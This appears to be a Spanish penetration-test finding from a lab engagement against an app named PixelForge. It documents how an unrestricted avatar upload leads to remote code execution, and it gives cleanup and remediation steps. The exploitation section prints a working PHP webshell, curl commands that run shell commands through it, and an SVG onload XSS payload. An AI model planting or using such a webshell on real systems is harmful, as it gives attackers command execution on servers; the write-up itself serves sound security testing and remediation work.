# 📤 F-013 — Subida de fichero sin restricciones en account.php → ejecución remota de código (RCE)

![Severidad](https://img.shields.io/badge/severidad-cr%C3%ADtico-critical) ![CVSS](https://img.shields.io/badge/CVSS-9.8-red) ![CWE](https://img.shields.io/badge/CWE-434-blue) ![App](https://img.shields.io/badge/app-PixelForge-purple)

> [!IMPORTANT]
> El formulario "Change profile picture" de `account.php` no valida extensión ni contenido del fichero subido, no lo renombra, y lo guarda en un directorio donde PHP se ejecuta. Subir un `.php` como avatar equivale a dejar una webshell lista para usar. 🏆 Hallazgo estrella.

## 📖 Contexto

`account.php` incluye un formulario de cambio de foto de perfil (`<input type="file" name="avatar">`, `multipart/form-data`), disponible para **cualquier cuenta autenticada**, sin distinción de rol — no hace falta ser administrador. El servidor no valida la extensión real ni el tipo MIME, no renombra el fichero, y lo guarda directamente bajo `/var/www/gamestore/uploads/`, una ruta servida públicamente por Apache donde los `.php` se interpretan como código.

## 🔬 Explotación paso a paso

**1. Preparar el payload** — una webshell mínima en PHP:

```php
<?php if(isset($_GET['cmd'])){ echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>
```

**2. Subirla como avatar:**

```http
POST /account.php HTTP/1.1
Content-Type: multipart/form-data; boundary=...

[avatar=shell.php]
```

→ `302 Found`, `Location: /account.php`. El `<img>` de la vista de perfil pasa a apuntar a `src="/uploads/shell.php"`, confirmando dónde quedó guardado el fichero — sin ningún renombrado.

**3. Ejecutar comandos directamente desde la URL:**

```bash
$ curl "http://172.17.0.2:10000/uploads/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ curl "http://172.17.0.2:10000/uploads/shell.php?cmd=pwd"
/var/www/gamestore/uploads
```

**RCE confirmada.**

### No hace falta ser administrador

La misma prueba se repitió con una cuenta de cliente normal, autoregistrada al vuelo sin ningún dato real (ver [F-014](F-014-politica-registro-debil.md)), con idéntico resultado:

```bash
$ curl "http://172.17.0.2:10000/uploads/qa_shell.php?cmd=id"
QA_CUSTOMER_UPLOAD_uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Dos rutas independientes** (inyección SQL directa, o autoregistro trivial) llegan al mismo RCE — ver la cadena completa en [F-015](F-015-cadena-completa-invitado-rce.md).

### Prueba adicional: ausencia total de filtrado

También se probó un `.svg` con `onload="alert(document.domain)"` — ejecuta JavaScript al abrirlo directamente (no al mostrarlo como `<img>`), confirmando que no hay ningún filtrado, ni siquiera una whitelist básica de tipos de imagen.

### 🧹 Limpieza tras la prueba

Ambos webshells de PoC se autoeliminaron del servidor inmediatamente después de confirmar la ejecución, usando el propio RCE (`cmd=rm+-f+...`), y se verificó la eliminación (`404` al volver a pedir la URL). **No queda ningún artefacto de la prueba en el servidor del laboratorio.**

## 💥 Impacto

> [!CAUTION]
> Ejecución remota de comandos arbitrarios como `www-data`, alcanzable (1) directamente con cualquier cuenta autoregistrada sin ninguna identidad real, o (2) en un solo paso adicional a partir de la inyección SQL de [F-012](F-012-sqli-login-bypass-auth.md), sin pasar por el registro. Es el hallazgo más grave de todo el compromiso de PixelForge — causa raíz compartida de la cadena completa documentada en [F-015](F-015-cadena-completa-invitado-rce.md), que termina en escalada de privilegios local ([F-016](F-016-escalada-privilegios-sudo-php.md)) y toma de cuenta administradora real ([F-017](F-017-secretos-credenciales-config-php.md), [F-018](F-018-toma-cuenta-tokens-mail-log.md)).

## 🛡️ Remediación

- Validar el tipo de fichero subido por **contenido real** (no por extensión ni `Content-Type` del cliente, ambos controlables por el atacante) — p. ej. `getimagesize()` en PHP, o re-codificar el fichero con una librería de procesado de imágenes.
- **Renombrar** siempre el fichero subido a un nombre generado por el servidor (UUID), sin conservar la extensión original proporcionada por el cliente.
- Servir el directorio de subidas (`/uploads/`) con la ejecución de PHP **desactivada** (`php_admin_flag engine off` en la configuración de Apache para ese directorio), o moverlo fuera del document root y servirlo mediante un script intermedio.
- Limitar tamaño y tasa de subidas por usuario.

## 🔗 Hallazgos relacionados

- [F-012 — Inyección SQL en login.php](F-012-sqli-login-bypass-auth.md) y [F-014 — Política de registro débil](F-014-politica-registro-debil.md): las dos rutas independientes que llegan hasta aquí.
- [F-015 — Cadena completa: invitado anónimo → RCE](F-015-cadena-completa-invitado-rce.md): documenta ambas rutas de principio a fin.
- [F-016 — Escalada de privilegios local](F-016-escalada-privilegios-sudo-php.md): lo que se hizo con este RCE una vez obtenido.

---
⬅ [Volver al índice de writeups](README.md) · [README principal](../README.md) · [Informe técnico (PDF)](../docs/informe-BigShop.pdf)
